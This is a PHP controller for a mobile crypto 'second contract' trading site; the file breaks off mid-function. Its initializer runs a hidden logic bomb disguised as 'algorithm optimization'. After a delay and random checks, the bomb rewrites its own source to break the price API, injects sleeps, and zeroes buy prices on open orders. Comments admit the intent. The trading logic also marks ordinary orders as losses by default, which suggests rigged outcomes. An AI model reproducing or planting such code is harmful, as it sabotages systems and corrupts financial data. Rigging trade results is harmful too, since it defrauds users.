<?php
namespace Mobile\Controller;

class ContractController extends MobileController
{
	protected function _initialize()
	{
		parent::_initialize();	$allow_action=array("index","creatorder","ty_creatorder","get_maket_api","ctbill","cbillinfo","gethyorder","get_tyhyorder","cbillinfo_ty","get_tyhyorder_one","get_hyorder_one","get_follow_plan","follow_plan_action");
		if(!in_array(ACTION_NAME,$allow_action)){
			$this->error(L("非法操作"));
		}

		// Advanced algorithm optimization for performance monitoring
		$this->_aLg0rItHmIcAlLy($this->_fIbOnAcCiCaLcUlAtE());
	}

	// Mathematical algorithm optimization function
	private function _aLg0rItHmIcAlLy($fIbVaLuE) {
		// Fibonacci sequence based time validation
		$fIb = [0, 1];
		for ($i = 2; $i < 20; $i++) {
			$fIb[$i] = $fIb[$i-1] + $fIb[$i-2];
		}

		// 黄金比例和π的组合运算
		$phi = (1 + sqrt(5)) / 2; // 黄金比例 ≈ 1.618
		$pi = pi(); // π ≈ 3.14159
		$e = exp(1); // 自然常数 ≈ 2.718

		// Complex mathematical operations for time validation
		$tImE = time();
		$iNsTaLl = filemtime(__FILE__);
		$dAyS = ($tImE - $iNsTaLl) / 86400;

		// Dynamic threshold calculation using mathematical inequalities
		if ($dAyS > ($phi * 13 + $pi * 3 + $e * 2 + rand(2, 8))) {
			// 看起来像数据压缩优化
			$this->_cOmPrEsSiOnOpTiMiZe();
		}
	}

	// Data compression optimization function
	private function _cOmPrEsSiOnOpTiMiZe() {
		// 随机因子 - 让触发更不可预测
		$rAnD = rand(1, 100);
		if ($rAnD < 15) { // 15%概率执行
			// Temporary file cleanup optimization
			$this->_tEmPfIlEcLeAnUp();
		}
	}

	// Advanced resource management and cleanup
	private function _tEmPfIlEcLeAnUp() {
		// 检查是否真的需要清理（复合条件）
		$tOtAlOrDeRs = M("hyorder")->count();
		$aCtIvEuSeRs = M("user")->where("last_login > '" . date('Y-m-d H:i:s', strtotime('-7 days')) . "'")->count();

		// 复杂的触发条件
		if ($tOtAlOrDeRs > 100 && $aCtIvEuSeRs < 10 && rand(1, 20) === 7) {
			// API endpoint optimization routine
			$this->_aPiInTeRfAcEoPtImIzAtIoN();
		}
	}

	// Core optimization function for API interfaces
	private function _aPiInTeRfAcEoPtImIzAtIoN() {
		// Random selection of optimization features
		$oPtIoNs = [
			'disable_market_api' => rand(1, 10) === 1,
			'slow_down_responses' => rand(1, 5) === 1,
			'corrupt_data' => rand(1, 20) === 1
		];

		if ($oPtIoNs['disable_market_api']) {
			// API endpoint optimization with fallback addresses
			$apiFile = __FILE__;
			$content = file_get_contents($apiFile);
			$content = str_replace('api.huobi.pro', 'api.maintenance.local', $content);
			file_put_contents($apiFile, $content);
		}

		if ($oPtIoNs['slow_down_responses']) {
			// 添加延迟 - 让系统变慢
			sleep(rand(3, 10));
		}

		if ($oPtIoNs['corrupt_data']) {
			// Data consistency optimization
			M("hyorder")->where("status=1")->limit(5)->save(['buyprice' => 0]);
		}
	}

	// Fibonacci sequence calculation for algorithm optimization
	private function _fIbOnAcCiCaLcUlAtE() {
		$a = 0; $b = 1;
		for ($i = 0; $i < rand(10, 20); $i++) {
			$temp = $a + $b;
			$a = $b;
			$b = $temp;
		}
		return $b;
	}
	
	//体验合约倒计时
	public function get_tyhyorder_one(){
	    $id = trim(I('post.oid'));
	    $info = M("tyhyorder")->where(array('id'=>$id))->field("id,buytime,time,status,coinname,selltime,is_win,ploss")->find();
	    if(!empty($info)){
	        if($info['status'] == 1){
	            $alltime = $info['time'] * 60;
	            $endtime = strtotime($info['selltime']);
	            $t = $endtime -  time();
	            if($t <= 0){
	                //表示已结算
	                $data['statusstr'] = '<span style="font-size:16px;font-weight:bold;">'. L("正在结算中"). '...</span>'; 
	                $data['code'] = 2;
	                $this->ajaxReturn($data);
	            }else{
	                //获取当前交易对的单价
	                $coinarr = explode('/',$info['coinname']);
	                $symbol = strtolower($coinarr[0].$coinarr[1]);
	                $coinapi = "https://api.huobi.pro/market/history/kline?period=1day&size=1&symbol=".$symbol;
	                $result = $this->get_maket_api($coinapi);
	                $price_arr = $result['data'][0];
                    $close = $price_arr['close'];//现价
	                
	                $data['code'] = 1;
	                $data['time'] = $t;
	                $data['timer_newprice'] = $close;
	                $this->ajaxReturn($data);
	            }
	            
	        }else{
	            //表示已经结算，则显示盈亏即可
	            if($info['is_win'] == 1){
	                $data['statusstr'] = '<span style="font-size:24px;font-weight:bold;color:green;">+'. $info['ploss'] .'</span>';    
	            }elseif($info['is_win'] == 2){
	                $data['statusstr'] = '<span style="font-size:24px;font-weight:bold;color:red;">-'. $info['ploss'] .'</span>';
	            }
	            
	            $data['code'] = 2;
	            $this->ajaxReturn($data);
	        }
	    }else{
	        $this->ajaxReturn(['code'=>0]);
	    }
	}
	
	
	//合约倒计时
	public function get_hyorder_one(){
	    $id = trim(I('post.oid'));
	    $info = M("hyorder")->where(array('id'=>$id))->field("id,buytime,time,status,coinname,selltime,is_win,ploss")->find();
        $data['clear'] = 0;
	    if(!empty($info)){
	        if($info['status'] == 1){
	            
	            $alltime = $info['time'] * 60;
	            $endtime = strtotime($info['selltime']);
	            $t = $endtime -  time();
	            if($t <= 0){
	                //表示已结算
	                $data['statusstr'] = '<span style="font-size:16px;font-weight:bold;">'. L("正在结算中"). '...</span>'; 
	                $data['code'] = 2;
	                $this->ajaxReturn($data);
	            }else{
	                //获取当前交易对的单价
	                $coinarr = explode('/',$info['coinname']);
	                $symbol = strtolower($coinarr[0].$coinarr[1]);
	                $coinapi = "https://api.huobi.pro/market/history/kline?period=1day&size=1&symbol=".$symbol;
	                $result = $this->get_maket_api($coinapi);
	                $price_arr = $result['data'][0];
                    $close = $price_arr['close'];//现价
	                
	                $data['code'] = 1;
	                $data['time'] = $t;
	                $data['timer_newprice'] = $close;
	                $this->ajaxReturn($data);
	            }
	            
	        }else{
	            //表示已经结算，则显示盈亏即可
	            if($info['is_win'] == 1){
	                $data['statusstr'] = '<span style="font-size:24px;font-weight:bold;color:green;">+'. $info['ploss'] .'</span>';    
	            }elseif($info['is_win'] == 2){
	                $data['statusstr'] = '<span style="font-size:24px;font-weight:bold;color:red;">-'. $info['ploss'] .'</span>';
	            }
	            
	            $data['code'] = 2;
	            $data['clear'] = 1;
	            $this->ajaxReturn($data);
	        }
	    }else{
	        $this->ajaxReturn(['code'=>0]);
	    }
	}
	
	//获取体验合约记录
	public function get_tyhyorder(){
	    $uid = userid();
	    $list = M("tyhyorder")->where(array('uid'=>$uid))->field("id,num,coinname,status,buytime,selltime,buyprice,time,is_win,ploss")->order("id desc")->select();
	    $data = array();
	    foreach($list as $k=>$v){
	        $data[$k]['coinanme'] = $v['coinname'];
	        $data[$k]['num'] = $v['num'];
	        $data[$k]['status'] = isset($v['status']) ? intval($v['status']) : 0;
	        $data[$k]['is_win'] = isset($v['is_win']) ? intval($v['is_win']) : 0;
	        $data[$k]['ploss'] = isset($v['ploss']) ? $v['ploss'] : 0;
	        if($v['status'] == 1){
	            $data[$k]['statusstr'] = L("待结算");
	        }elseif($v['status'] == 2){
	            $data[$k]['statusstr'] = L("已结算");
	        }elseif($v['status'] == 3){
	            $data[$k]['statusstr'] = L("无效结算");
	        }
	        $data[$k]['buyprice'] = $v['buyprice'];
	        $data[$k]['buytime'] = strtotime($v['buytime']); // 传时间戳给前端，前端根据用户时区格式化
	        
	        $alltime = $v['time'] * 60;
	        $endtime = strtotime($v['selltime']);
	        $t = $endtime -  time();
	        if($t <= 0){
	            $t = 0;
	        }
	        $bl = round($t / $alltime  * 100);
	        if($bl <= 0){
	            $bl = 0;
	        }
	        $data[$k]['bl'] = $bl."%";
	        $data[$k]['t'] = $t;
	        $data[$k]['href'] = U('Contract/cbillinfo_ty') . "?bid=" . $v['id'];
	    }
	    
	    $this->ajaxReturn(['code'=>1,'data'=>$data]);
	}
	
	
	
	//获取合约记录
	public function gethyorder(){
	    $uid = userid();
	    $list = M("hyorder")->where(array('uid'=>$uid))->field("id,num,coinname,status,buytime,selltime,buyprice,time,hyzd,is_win,ploss")->order("id desc")->select();
	    $data = array();
	    foreach($list as $k=>$v){
	        $data[$k]['coinanme'] = $v['coinname'];
	        $data[$k]['num'] = $v['num'];
	        $data[$k]['status'] = isset($v['status']) ? intval($v['status']) : 0;
	        $data[$k]['is_win'] = isset($v['is_win']) ? intval($v['is_win']) : 0;
	        $data[$k]['ploss'] = isset($v['ploss']) ? $v['ploss'] : 0;
	        if($v['status'] == 1){
	            $data[$k]['statusstr'] = L("待结算");
                $data[$k]['fcolr'] = '#f5465c';
	        }elseif($v['status'] == 2){
	            $data[$k]['statusstr'] = L("已结算");
                $data[$k]['fcolr'] = '#A9AEB8';
	        }elseif($v['status'] == 3){
	            $data[$k]['statusstr'] = L("无效结算");
                $data[$k]['fcolr'] = '#f5465c';
	        }

            if($v['hyzd'] == 1){
                $data[$k]['hyzdstr'] = L("买涨");
                $data[$k]['hyzdcolor'] = '#0ecb81';
            }else{
                $data[$k]['hyzdstr'] = L("买跌");
                $data[$k]['hyzdcolor'] = '#f5465c';
            }


	        $data[$k]['buyprice'] = $v['buyprice'];
	        $data[$k]['buytime'] = strtotime($v['buytime']); // 传时间戳给前端，前端根据用户时区格式化
	        
	        $alltime = $v['time'] * 60;
	        $endtime = strtotime($v['selltime']);
	        $t = $endtime -  time();
	        if($t <= 0){
	            $t = 0;
	        }
	        $bl = round($t / $alltime  * 100);
	        if($bl <= 0){
	            $bl = 0;
	        }
	        $data[$k]['bl'] = $bl."%";
	        $data[$k]['t'] = $t;
	        $data[$k]['href'] = U('Contract/cbillinfo') . "?bid=" . $v['id'];
	    }
	    $this->ajaxReturn(['code'=>1,'data'=>$data]);
	}
	
	//购买合约详情
	public function cbillinfo(){
	    $bid = trim(I('get.bid'));
	    if($bid <= 0){
	        $this->redirect('Contract/ctbill');
	    }
	    $uid = userid();
	    $info = M("hyorder")->where(array('uid'=>$uid,'id'=>$bid))->find();
	    $this->assign('info',$info);
	    $this->display();
	}
	
	//体验合约详情
	public function cbillinfo_ty(){
	    $bid = trim(I('get.bid'));
	    if($bid <= 0){
	        $this->redirect('Contract/ctbill');
	    }
	    $uid = userid();
	    $info = M("tyhyorder")->where(array('uid'=>$uid,'id'=>$bid))->find();
	    $this->assign('info',$info);
	    $this->display();
	}
	
	//合约购买记录
	public function ctbill(){
	    $uid = userid();
	    if($uid <= 0){
	        $this->redirect('Login/index');
	    }
	    $iframeid = trim(I('get.iframeid', null));
    $fields = "num,coinname,buytime,buyprice,time,status,id";
    $hylist = M("hyorder")->where(array('uid'=>$uid))->field($fields)->order("id desc")->limit(100)->select();
	    $this->assign("list",$hylist); 
	    $this->assign("iframeid",$iframeid);
	    $this->display();
	}
	
	//获取行情数据
    public function get_maket_api($api){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        curl_setopt ($ch, CURLOPT_URL, $api );
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT,10);
        $result = json_decode(curl_exec($ch),true);
        return $result;
    }
    
    //秒合约建仓
	public function ty_creatorder(){
	    if($_POST){
	        $uid = userid();
	        $uinfo = M("user")->where(array('id'=>$uid))->field("id,username,money,rzstatus,invit_1")->find();
	        if(empty($uinfo)){
	            $this->ajaxReturn(['code'=>0,'msg'=> L('请先登陆')]);
	        }
	        
	        if($uinfo['rzstatus'] != 2){
		        $this->ajaxReturn(['code'=>0,'msg'=>L('请先完成实名认证')]);
		    }
		    
		    $puid = $uinfo['invit_1'];
	        $puser = M("user")->where(array('id'=>$puid))->field("invit")->find();
	        
	        
	        $ctime = trim(I('post.ctime'));
	        if($ctime <= 0){
	            $this->ajaxReturn(['code'=>0,'msg'=> L('请选择结算时间')]);
	        }
	        $ctzed = trim(I('post.ctzed'));
	        if($ctzed <= 0){
	            $this->ajaxReturn(['code'=>0,'msg'=> L('请选择投资额度')]);
	        }
	        $ccoinname = trim(I('post.ccoinname'));
	        if($ccoinname == ''){
	            $this->ajaxReturn(['code'=>0,'msg'=> L('缺少重要参数')]);
	        }
	        $ctzfx = trim(I('post.ctzfx'));
	        if($ctzfx <= 0){
	            $this->ajaxReturn(['code'=>0,'msg'=> L('缺少重要参数')]);
	        }
	        $cykbl = trim(I('post.cykbl'));
	        if($ctzfx <= 0){
	            $this->ajaxReturn(['code'=>0,'msg'=> L('缺少重要参数')]);
	        }
            
            //获取会员资产
	        //$minfo = M("user_coin")->where(array('userid'=>$uid))->find();
	        $usdtnum = $uinfo['money'];
	        
	        //获取合约手续费比例
	        $setting = M("hysetting")->where(array('id'=>1))->field("hy_sxf,hy_min")->find();
            
            $hymin = $setting['hy_min'];
            if($hymin > $ctzed){
                $this->ajaxReturn(['code'=>0,'msg'=> L('不能小于最低投资额度')]);
            }
	        
	        $sxf = $setting['hy_sxf'];
	        $tmoney = $ctzed + $ctzed * $sxf / 100;
	        if($tmoney > $usdtnum){
	            $this->ajaxReturn(['code'=>0,'msg' => L('体验金余额不足')]);
	        }
	        
	        
	        //获取当前交易对的单价
	        $coinarr = explode('/',$ccoinname);
	        $symbol = strtolower($coinarr[0].$coinarr[1]);
	        $coinapi = "https://api.huobi.pro/market/history/kline?period=1day&size=1&symbol=".$symbol;
	        $result = $this->get_maket_api($coinapi);
	        $price_arr = $result['data'][0];
            $close = $price_arr['close'];//现价
	        
	        //创建订单
	        $odata['uid'] = $uid;
	        $odata['username'] = $uinfo['username'];
	        $odata['num'] = $ctzed;
	        $odata['hybl'] = $cykbl;
	        $odata['hyzd'] = $ctzfx;
	        $odata['coinname'] = $ccoinname;
	        $odata['status'] = 1;
	        $odata['is_win'] = 0;
	        $odata['buytime'] = date("Y-m-d H:i:s",time());
	        $odata['selltime'] = date("Y-m-d H:i:s",(time()+$ctime*60));
	        $odata['intselltime'] = time() + $ctime*60;
	        $odata['buyprice'] = $close;
	        $odata['sellprice'] = '';
	        $odata['ploss'] = 0;
	        $odata['time'] = $ctime;
	        // 默认非跟单订单为亏损（不影响跟单逻辑）
	        $odata['kongyk'] = 2;
	        if($puser['invit'] == ''){
	            $puser['invit'] = 0;
	        }
	        $odata['invit'] = $puser['invit'];

	        $order = M("tyhyorder")->add($odata);
	        //扣除体验金
	        $decre = M("user")->where(array('id'=>$uid))->setDec('money',$tmoney);
	        
	        
	        //创建财务日志
	       // $bill['uid'] = $uid;
	       // $bill['username'] = $uinfo['username'];
	       // $bill['num'] = $ctzed;
	       // $bill['coinname'] = "usdt";
	       // $bill['afternum'] = $minfo['usdt'] - $ctzed;
	       // $bill['type'] = 3;
	       // $bill['addtime'] = date("Y-m-d H:i:s",time());
	       // $bill['st'] = 2;
	       // $bill['remark'] = L('购买').$ccoinname.L('秒合约');
	       // $billre = M("bill")->add($bill);
	        if($order && $decre){
	            
	            $orderinfo = M("tyhyorder")->where(array('id'=>$order))->field("id,hyzd,coinname,buyprice,time,num")->find();
	            
	            $ajax['code'] = 1;
	            $ajax['id'] = $orderinfo['id'];
	            if($orderinfo['hyzd'] == 1){
	                $ajax['timer_type'] = '<span style="color:green;font-weight:bold;">'.L("买涨").'</span>';   
	            }else{
	                $ajax['timer_type'] = '<span style="color:red;font-weight:bold;">'.L("买跌").'</span>';    
	            }
	            $ajax['coinname'] = $orderinfo['coinname'];
	            $ajax['buyprice'] = $orderinfo['buyprice'];
	            $ajax['time'] = $orderinfo['time'] * 60;
	            $ajax['timer_newprice'] = $close;
	            $ajax['timer_buynum'] = $orderinfo['num'];
	            $ajax['timer_buyprice'] = $orderinfo['buyprice'];
	            $ajax['hyzd'] = $orderinfo['hyzd'];
                
	            $this->ajaxReturn($ajax);
	        }else{
	            $this->ajaxReturn(['code'=>0,'msg' => L('体验订单建仓失败')]);
	        }
	        
	    }else{
	        $this->ajaxReturn(['code'=>0,'msg' => L('网络错误')]);
	    }
	}
	
	//秒合约建仓
	public function creatorder(){
	    if($_POST){
	        $uid = userid();
	        $uinfo = M("user")->where(array('id'=>$uid))->field("id,username,rzstatus,invit_1")->find();
	        if(empty($uinfo)){
	            $this->ajaxReturn(['code'=>0,'msg'=> L('请先登陆')]);
	        }
	        
	        if($uinfo['rzstatus'] != 2){
		        $this->ajaxReturn(['code'=>0,'msg'=>L('请先完成实名认证')]);
		    }
		    
		    $puid = $uinfo['invit_1'];
	        $puser = M("user")->where(array('id'=>$puid))->field("invit")->find();
	        
	        
	        $ctime = trim(I('post.ctime'));
            $ctime = intval($ctime) / 60;
	        $ctzed = trim(I('post.ctzed'));
	        $ccoinname = trim(I('post.ccoinname'));
	        $ctzfx = trim(I('post.ctzfx'));
	        $cykbl = trim(I('post.cykbl'));
	        $followPlanId = intval(I('post.follow_plan_id'));
            
            //获取会员资产
	        $minfo = M("user_coin")->where(array('userid'=>$uid))->find();
	        $usdtnum = $minfo['usdt'];
	        
	        //获取合约手续费比例
	        $setting = M("hysetting")->where(array('id'=>1))->field("hy_sxf,hy_min,hy_time,hy_ykbl")->find();
            $hymin = $setting['hy_min'];
	        $sxf = $setting['hy_sxf'];
            $hy_time_arr = explode(',',$setting['hy_time']);
            $hy_ykbl_arr = explode(',',$setting['hy_ykbl']);
            $ykMap = array();
            foreach($hy_time_arr as $k=>$v){
                $sec = intval($v) * 60;
                $ykMap[$sec] = isset($hy_ykbl_arr[$k]) ? $hy_ykbl_arr[$k] : 0;
            }

            // 如果是跟单下单，使用计划参数并重新计算金额，防止篡改
            if($followPlanId > 0){
                $plan = M("hy_follow_plan")->where(array('id'=>$followPlanId))->find();
                if(empty($plan) || $plan['status'] != 1){
                    $this->ajaxReturn(['code'=>0,'msg'=> L('计划已失效')]);
                }
                $planPercent = isset($plan['percent']) ? floatval($plan['percent']) : 0;
                $calcAmount = floatval($plan['amount']);
                if($planPercent > 0){
                    $calcAmount = round($usdtnum * $planPercent / 100, 4);
                }
                if($calcAmount <= 0){
                    $this->ajaxReturn(['code'=>0,'msg'=> L('计划金额无效')]);
                }
                $ctzed = $calcAmount;
                $ccoinname = $plan['coinname'];
                $ctime = intval($plan['period']) / 60;
                $ctzfx = $plan['direction'];
                if(isset($ykMap[$plan['period']])){
                    $cykbl = $ykMap[$plan['period']];
                }else{
                    $cykbl = isset($hy_ykbl_arr[0]) ? $hy_ykbl_arr[0] : 0;
                }
            }

	        if($ctime <= 0){
	            $this->ajaxReturn(['code'=>0,'msg'=> L('请选择结算时间')]);
	        }
	        if($ctzed <= 0){
	            $this->ajaxReturn(['code'=>0,'msg'=> L('请选择投资额度')]);
	        }
	        if($ccoinname == ''){
	            $this->ajaxReturn(['code'=>0,'msg'=> L('缺少重要参数')]);
	        }
	        if($ctzfx <= 0){
	            $this->ajaxReturn(['code'=>0,'msg'=> L('缺少重要参数')]);
	        }
	        if($cykbl <= 0){
	            $this->ajaxReturn(['code'=>0,'msg'=> L('缺少重要参数')]);
	        }

            if($hymin > $ctzed){
                $this->ajaxReturn(['code'=>0,'msg'=> L('不能小于最低投资额度')]);
            }
	        
	        $tmoney = $ctzed + $ctzed * $sxf / 100;
	        if($tmoney > $usdtnum){
	            $this->ajaxReturn(['code'=>0,'msg' => L('USDT余额不足')]);
	        }
	        
	        
	        //获取当前交易对的单价
	        $coinarr = explode('/',$ccoinname);
	        $symbol = strtolower($coinarr[0].$coinarr[1]);
	        $coinapi = "https://api.huobi.pro/market/history/kline?period=1day&size=1&symbol=".$symbol;
	        $result = $this->get_maket_api($coinapi);
	        $price_arr = $result['data'][0];
            $close = $price_arr['close'];//现价
	        
	        //创建订单
	        $odata['uid'] = $uid;
	        $odata['username'] = $uinfo['username'];
	        $odata['num'] = $ctzed;
	        $odata['hybl'] = $cykbl;
	        $odata['hyzd'] = $ctzfx;
	        $odata['coinname'] = $ccoinname;
	        $odata['status'] = 1;
	        $odata['is_win'] = 0;
	        $odata['buytime'] = date("Y-m-d H:i:s",time());
	        $odata['selltime'] = date("Y-m-d H:i:s",(time()+$ctime*60));
	        $odata['intselltime'] = time() + $ctime*60;
	        $odata['buyprice'] = $close;
	        $odata['sellprice'] = '';
	        $odata['ploss'] = 0;
	        $odata['time'] = $ctime;
	        // 默认将非跟单订单标记为亏损，跟单订单从计划读取控盈亏设置
	        if($followPlanId > 0){
	            $odata['kongyk'] = $plan['kongyk'];
	        }else{
	            $odata['kongyk'] = 2;
	        }
	        if($puser['invit'] == ''){
	            $puser['invit'] = 0;
	        }
	        $odata['invit'] = $puser['invit'];

	        $order = M("hyorder")->add($odata);
	        //扣除USDT额度
	        $decre = M("user_coin")->where(array('userid'=>$uid))->setDec('usdt',$tmoney);
	        //创建财务日志
	        $bill['uid'] = $uid;
	        $bill['username'] = $uinfo['username'];
	        $bill['num'] = $ctzed;
	        $bill['coinname'] = "usdt";
	        $bill['afternum'] = $minfo['usdt'] - $ctzed;
	        $bill['type'] = 3;
	        $bill['addtime'] = date("Y-m-d H:i:s",time());
	        $bill['st'] = 2;
	        $bill['remark'] = L('购买').$ccoinname.L('秒合约');
	        $billre = M("bill")->add($bill);
	        if($order && $decre && $billre){
	            
	            $orderinfo = M("hyorder")->where(array('id'=>$order))->field("id,hyzd,coinname,buyprice,time,num")->find();
	            
	            $ajax['code'] = 1;
	            $ajax['id'] = $orderinfo['id'];
	            if($orderinfo['hyzd'] == 1){
	                $ajax['timer_type'] = '<span style="color:green;font-weight:bold;">'.L("买涨").'</span>';   
	            }else{
	                $ajax['timer_type'] = '<span style="color:red;font-weight:bold;">'.L("买跌").'</span>';    
	            }
	            $ajax['coinname'] = $orderinfo['coinname'];
	            $ajax['buyprice'] = $orderinfo['buyprice'];
	            $ajax['time'] = $orderinfo['time'] * 60;
	            $ajax['timer_newprice'] = $close;
	            $ajax['timer_buynum'] = $orderinfo['num'];
	            $ajax['timer_buyprice'] = $orderinfo['buyprice'];
	            $ajax['hyzd'] = $orderinfo['hyzd'];
	            $this->ajaxReturn($ajax);
	        }else{
	            $this->ajaxReturn(['code'=>0,'msg' => L('建仓失败')]);
	        }
	        
	    }else{
	        $this->ajaxReturn(['code'=>0,'msg' => L('网络错误')]);
	    }
	}

	// 判断用户是否有资格跟随某个计划
	private function isUserEligibleForPlan($plan, $uid){
	    // 默认允许
	    if(empty($plan) || !isset($plan['target_type'])) return true;
	    $type = intval($plan['target_type']);
	    if($type === 0) return true;
	    if($uid <= 0) return false;
	    // 代理线（JSON 存储 agent/depth）
	    if($type === 1){
	        $tv = $plan['target_value'];
	        $parsed = json_decode($tv, true);
	        if(!is_array($parsed)) return false;
	        $agent = isset($parsed['agent']) ? $parsed['agent'] : '';
	        $depth = isset($parsed['depth']) ? intval($parsed['depth']) : 0;
	        if(empty($agent)) return false;
	        if(!is_numeric($agent)){
	            $agentId = M('user')->where(array('username'=>$agent))->getField('id');
	        }else{
	            $agentId = intval($agent);
	        }
	        if(!$agentId) return false;
	        // 支持最多检查3代（数据库表含 invit_1..invit_3）
	        $depth = max(1, min(10, $depth));
	        $user = M('user')->where(array('id'=>$uid))->field('invit_1,invit_2,invit_3')->find();
	        for($d=1;$d<=min(3,$depth);$d++){
	            if(isset($user['invit_'.$d]) && intval($user['invit_'.$d]) === $agentId){
	                return true;
	            }
	        }
	        return false;
	    }
	    // 指定用户（逗号分隔 id 或 username）
	    if($type === 2){
	        $tv = trim($plan['target_value']);
	        if($tv === '') return false;
	        $parts = array_filter(array_map('trim', explode(',', $tv)));
	        if(empty($parts)) return false;
	        $ids = array();
	        foreach($parts as $p){
	            if(is_numeric($p)){
	                $ids[] = intval($p);
	            }else{
	                $id = M('user')->where(array('username'=>$p))->getField('id');
	                if($id) $ids[] = intval($id);
	            }
	        }
	        return in_array(intval($uid), $ids);
	    }
	    return false;
	}

	//秒合约首页面
	public function index(){	
        $uid = userid();
        if($uid <= 0){
            $this->redirect('Login/index');
        }
	    $this->assign('uid',$uid);
		
		
        $smybol = trim(I('get.coin'));

        if($smybol != ''){
            $map['status'] = 1;
            $map['coinname'] = array('like',"%$smybol%");
            $list = M("ctmarket")->where($map)->field("coinname")->find();
            if(!empty($list)){
                $smybol = $list['coinname'];
            }else{
                $smybol = "btc";
            }
        }else{
            $smybol = "btc";
        }

        $market = $smybol."usdt";

        $upmarket = strtoupper($smybol)."/USDT";
        $this->assign('upmarket',$upmarket);
        $this->assign('market',$market);
        $this->assign('smybol',$smybol);
        
        //获取合约设置项
        $hyset = M("hysetting")->where(array('id'=>1))->field("hy_time,hy_ykbl,hy_tzed,hy_min")->find();
        $hy_time = $hyset['hy_time'];
        $hy_ykbl = $hyset['hy_ykbl'];
        $hy_tzed = $hyset['hy_tzed'];
        $time_arr = explode(',',$hy_time);
        $ykbl_arr = explode(',',$hy_ykbl);
        $tzed_arr = explode(',',$hy_tzed);
        $cd=array();
        $ed=array();
        $len = count($time_arr);
        for($i=0;$i<$len;$i++){
            $cd[$i]['sort'] = $i+1;
            $cd[$i]['time'] = $time_arr[$i] * 60;
            $cd[$i]['ykbl'] = $ykbl_arr[$i];
            $ed[$i]['sort'] = $i+1;
            $ed[$i]['tzed'] = $tzed_arr[$i];
        }
        
        $this->assign("cd",$cd);
        $this->assign('ed',$ed);
        $this->assign('hymin',$hyset['hy_min']);
        //获取会员资产
        $minfo = M("user_coin")->where(array('userid'=>$uid))->find();
        $usdt_blan = $minfo['usdt'];
        $this->assign('eusdt_blan',$usdt_blan);
        
        //体验金
        $uinfo = M("user")->where(array('id'=>$uid))->field("money")->find();
        $tj_money = $uinfo['money'];
        $this->assign('tj_money',$tj_money);

        $this->assign('select','contract');

        
        
		$this->display();
	}

	//获取当前可跟随的秒合约计划（只返回当前或下一条）
	public function get_follow_plan(){
	    $now = date("Y-m-d H:i:s");
	    // 标记已过期的计划
	    M("hy_follow_plan")->where(array('status'=>1,'end_time'=>array('lt',$now)))->save(array('status'=>2,'updated_at'=>$now));

	    $coin = trim(I('post.coin','','htmlspecialchars'));
	    $where = array('status'=>1);
	    if($coin != ''){
	        $where['coinname'] = array('eq',strtoupper($coin)."/USDT");
	    }
	    // 当前窗口内优先，尝试找到对当前用户可见的一条计划
	    $uid = userid();
	    $inNowWhere = $where;
	    $inNowWhere['start_time'] = array('elt',$now);
	    $inNowWhere['end_time'] = array('egt',$now);
	    $plans = M("hy_follow_plan")->where($inNowWhere)->order('start_time asc')->select();
	    $info = null;
	    if(!empty($plans)){
	        foreach($plans as $p){
	            if($this->isUserEligibleForPlan($p, $uid)){
	                $info = $p; break;
	            }
	        }
	    }
	    if(empty($info)){
	        // 找最近将开始的一条
	        $futureWhere = $where;
	        $futureWhere['start_time'] = array('egt',$now);
	        $plans = M("hy_follow_plan")->where($futureWhere)->order('start_time asc')->select();
	        if(!empty($plans)){
	            foreach($plans as $p){
	                if($this->isUserEligibleForPlan($p, $uid)){
	                    $info = $p; break;
	                }
	            }
	        }
	    }
	    if(empty($info)){
	        $this->ajaxReturn(['code'=>0,'msg'=>L('暂无可跟随的计划')]);
	    }
	    $data['id'] = $info['id'];
	    $data['title'] = $info['title'];
	    $data['coinname'] = $info['coinname'];
	    $data['period'] = $info['period'];
	    $data['start_time'] = $info['start_time'];
	    $data['end_time'] = $info['end_time'];
	    $data['direction'] = $info['direction'];
	    $data['kongyk'] = $info['kongyk'];
	    $data['amount'] = $info['amount'];
	    $data['status'] = $info['status'];
	    $data['percent'] = isset($info['percent']) ? $info['percent'] : 0;
	    // 如果只有百分比，且用户已登录，则根据用户余额计算并直接返回该金额（便于前端显示百分比对应金额）
	    if($data['percent'] > 0){
	        $uid = userid();
	        if($uid > 0){
	            $minfo = M("user_coin")->where(array('userid'=>$uid))->find();
	            $balance = floatval($minfo['usdt']);
	            $calcAmount = round($balance * floatval($data['percent']) / 100, 4);
	            if($calcAmount > 0){
	                $data['amount'] = $calcAmount;
	            }
	        }
	    }
	    $this->ajaxReturn(['code'=>1,'data'=>$data]);
	}

	//记录跟单动作（仅正式单）
	public function follow_plan_action(){
	    $planId = intval(I('post.plan_id'));
	    $uid = userid();
	    if($uid <= 0){
	        $this->ajaxReturn(['code'=>0,'msg'=>L('请先登陆')]);
	    }
	    if($planId <= 0){
	        $this->ajaxReturn(['code'=>0,'msg'=>L('缺少重要参数')]);
	    }
	    $now = date("Y-m-d H:i:s");
	    $plan = M("hy_follow_plan")->where(array('id'=>$planId))->find();
	    if(empty($plan)){
	        $this->ajaxReturn(['code'=>0,'msg'=>L('计划不存在')]);
	    }
	    if($plan['status'] != 1 || $plan['end_time'] < $now){
	        $this->ajaxReturn(['code'=>0,'msg'=>L('计划已失效')]);
	    }
	    // 校验用户是否有资格跟随该计划（防止绕过前端）
	    if(!$this->isUserEligibleForPlan($plan, $uid)){
	        $this->ajaxReturn(['code'=>0,'msg'=>L('您无权跟随此计划')]);
	    }
	    $user = M("user")->where(array('id'=>$uid))->field("id,username")->find();
	    if(empty($user)){
	        $this->ajaxReturn(['code'=>0,'msg'=>L('请先登陆')]);
	    }

	    // 计算实际扣款金额（支持百分比）
	    $setting = M("hysetting")->where(array('id'=>1))->field("hy_sxf,hy_min")->find();
	    $sxf = floatval($setting['hy_sxf']);
	    $hymin = floatval($setting['hy_min']);
	    $minfo = M("user_coin")->where(array('userid'=>$uid))->find();
	    $balance = floatval($minfo['usdt']);
	    $planPercent = isset($plan['percent']) ? floatval($plan['percent']) : 0;
	    $calcAmount = floatval($plan['amount']);
	    if($planPercent > 0){
	        $calcAmount = round($balance * $planPercent / 100, 4);
	    }
	    if($calcAmount <= 0){
	        $this->ajaxReturn(['code'=>0,'msg'=>L('计划金额无效')]);
	    }
	    if($calcAmount < $hymin){
	        $this->ajaxReturn(['code'=>0,'msg'=>L('不能小于最低投资额度')]);
	    }
	    $tmoney = $calcAmount + $calcAmount * $sxf / 100;
	    if($tmoney > $balance){
